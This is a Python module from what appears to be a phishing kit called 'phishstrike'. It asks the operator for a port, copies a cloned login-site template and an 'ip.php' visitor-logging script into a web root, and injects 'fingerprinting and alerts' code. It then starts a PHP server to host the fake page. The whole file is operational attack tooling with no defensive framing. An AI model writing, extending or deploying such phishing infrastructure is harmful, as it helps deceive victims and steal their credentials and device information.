import os
import shutil
import subprocess
import sys
import time

from phishstrike import state
from phishstrike.lib import site_injector
from phishstrike.lib.terminal_ui import *


def cusport() -> None:
    print()
    ans = slow_input(
        "    [?] Do You Want A Custom Port [y/N]: ",
        start_rgb=(255, 215, 0),
        end_rgb=RGB_WHITE,
    )
    if ans.lower() == "y":
        print("\n")
        cu_p = slow_input(
            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Custom 4-digit Port "
            f"[1024-9999] : {LIGHT1}",
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )
        if cu_p.isdigit() and 1024 <= int(cu_p) <= 9999:
            state.PORT = cu_p
            print()
        else:
            print(
                f"\n\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid 4-digit Port : {cu_p}, "
                f"Try Again...{LIGHT1}"
            )
            time.sleep(2)
            os.system("cls" if os.name == "nt" else "clear")
            banner_small()
            cusport()
    else:
        slow_type(
            f"    [+] Deploying on Default Port {state.PORT}...",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )


def setup_site() -> None:
    state.stop_monitoring.set()
    slow_type(
        "    [+] Configuring Tactical Server Environment...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_AZURE,
    )
    site_dir = os.path.join(state.BASE_DIR, ".sites", state.website)
    www_dir = os.path.join(state.BASE_DIR, ".server/www")

    if not os.path.isdir(site_dir):
        print(
            f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} Error: Site directory "
            f"{state.website} not found!"
        )
        return

    for item in os.listdir(site_dir):
        s = os.path.join(site_dir, item)
        d = os.path.join(www_dir, item)
        if os.path.isdir(s):
            shutil.copytree(s, d, dirs_exist_ok=True)
        else:
            shutil.copy2(s, d)

    shutil.copy2(
        os.path.join(state.BASE_DIR, ".sites/ip.php"),
        os.path.join(www_dir, "ip.php"),
    )

    try:
        site_injector.inject_features(www_dir)
        slow_type(
            "    [+] Advanced Fingerprinting & Alerts Injected...",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_PURPLE,
        )
    except Exception as e:
        print(
            f"    {DARK}[{PINK}!{DARK}]{PINK} Warning: Could not inject advanced "
            f"features: {e}"
        )

    php_bin = shutil.which("php") or shutil.which("php.exe")
    if not php_bin:
        print(
            f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} PHP binary lost! "
            f"Re-check your installation."
        )
        sys.exit(1)

    slow_type(
        "    [+] Initializing PHP Server Core...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    php_log = os.path.join(state.BASE_DIR, ".server/.php.log")
    with open(php_log, "w") as log:
        subprocess.Popen(
            [php_bin, "-S", f"{state.HOST}:{state.PORT}", "-t", www_dir],
            stdout=log,
            stderr=log,
        )
